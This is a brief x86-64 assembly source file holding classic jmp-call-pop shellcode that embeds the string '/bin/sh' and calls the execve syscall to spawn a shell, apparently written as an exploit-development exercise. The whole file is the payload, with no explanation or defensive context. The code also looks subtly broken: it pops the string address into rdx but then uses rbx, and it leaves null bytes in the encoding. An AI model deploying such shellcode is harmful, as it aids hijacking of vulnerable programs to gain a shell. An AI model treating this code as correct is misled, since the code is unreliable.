section .text

global _start
	_start:
		BITS 64
		jmp short two

	one:
		pop rdx

		mov [rdx+8], rbx
		mov rax, 0x00
		mov [rbx+16], rax

		mov rdi, rbx
		lea rsi, [rbx+8]
		mov rdx, 0x00
		mov rax, 59
		syscall
	
	two:
		call one
		db '/bin/sh', 0
		db 'AAAAAAAA'
		db 'BBBBBBBB'

